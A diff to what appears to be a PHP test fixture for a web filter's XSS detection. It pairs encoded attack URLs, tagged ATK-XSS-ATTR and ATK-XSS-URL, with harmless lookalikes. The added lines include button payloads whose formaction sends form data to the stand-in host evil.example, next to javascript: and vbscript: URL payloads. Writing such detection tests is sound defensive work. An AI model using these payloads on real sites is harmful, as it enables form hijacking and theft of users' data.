@@ -101,7 +101,8 @@ return [
             ['/?q=%3Cbutton%20formaction%3Dhttps://evil.example/steal%3Ex', [], 'ATK-XSS-ATTR'],     // a button that sends the form elsewhere
             ['/?q=%3Cinput%20type%3Dsubmit%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
             ['/?q=%3Csvg%3E%3Ca%20xlink:href%3D%22javascript:alert(1)%22%3E%3Ctext%3Ex', [], 'ATK-XSS-ATTR'],   // SVG's link
-            ['/?q=%3Cframe%20srcdoc%3D%22x%22%3E', [], 'ATK-XSS-ATTR'],
+            ['/?q=%3Cbutton%20x%3D%26%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],       // an "&" inside the tag: decoded, no different from a separator
+            ['/?q=%3Cbutton%20title%3D%22a%26amp;b%22%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
             ['/?u=javascript:alert(document.domain)', [], 'ATK-XSS-URL'],
             ['/?u=vbscript:msgbox(1)', [], 'ATK-XSS-URL'],
             ['/?u=data:text/html,x', [], 'ATK-XSS-URL'],
@@ -240,7 +241,7 @@ return [
             '/search?q=%7B%7B%20user.name%20%7D%7D', // a placeholder, nothing computed
             '/?q={{ title }} and {{ date }}',
             '/?q={{#each items}}',                   // Handlebars: no call, no *
-            '/?q=a%3Cb&srcdoc=1',                    // "<" in one parameter, the word in another
+            '/?q=a%3Cb&srcdoc=1',                    // srcdoc is not looked for: it exists on <iframe> only, which ATK-XSS-TAG refuses
             '/?q=x%20%3C%20y%20formaction%3D1',      // "x < y": no tag
             '/?q=formaction%3Dsave',                 // the word without a tag
             '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
